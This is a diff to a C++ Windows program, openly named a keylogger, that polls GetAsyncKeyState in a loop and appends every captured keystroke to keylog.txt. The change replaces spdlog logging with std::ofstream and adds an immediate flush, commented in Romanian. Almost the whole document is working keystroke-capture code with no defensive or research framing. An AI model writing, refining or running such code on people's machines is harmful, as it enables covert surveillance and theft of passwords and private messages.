@@ -2,26 +2,30 @@
 #include <iostream>
 #include <fstream>
 #include <windows.h>
-#include "spdlog/spdlog.h"
-#include "spdlog/sinks/basic_file_sink.h"
 
-void logKey(spdlog::logger& logger, char key) {
+void logKey(std::ofstream& logfile, char key) {
     switch (key) {
-        case VK_BACK: logger.info("[BACKSPACE]"); break;
-        case VK_RETURN: logger.info("[ENTER]"); break;
-        case VK_SPACE: logger.info("[SPACE]"); break;
-        case VK_TAB: logger.info("[TAB]"); break;
-        default: logger.info("{}", key); break;
+        case VK_BACK: logfile << "[BACKSPACE]"; break;
+        case VK_RETURN: logfile << "[ENTER]"; break;
+        case VK_SPACE: logfile << "[SPACE]"; break;
+        case VK_TAB: logfile << "[TAB]"; break;
+        default: logfile << key; break;
     }
+    logfile.flush(); // Asigură că datele sunt scrise imediat în fișier
 }
 
 void keylogger() {
-    auto logger = spdlog::basic_logger_mt("keylogger", "keylog.txt");
+    std::ofstream logfile("keylog.txt", std::ios::app);
+    if (!logfile.is_open()) {
+        std::cerr << "Failed to open keylog.txt" << std::endl;
+        return;
+    }
+
     char key;
     while (true) {
         for (key = 8; key <= 222; key++) {
             if (GetAsyncKeyState(key) == -32767) {
-                logKey(*logger, key);
+                logKey(logfile, key);
             }
         }
         Sleep(10); // Reduce CPU usage
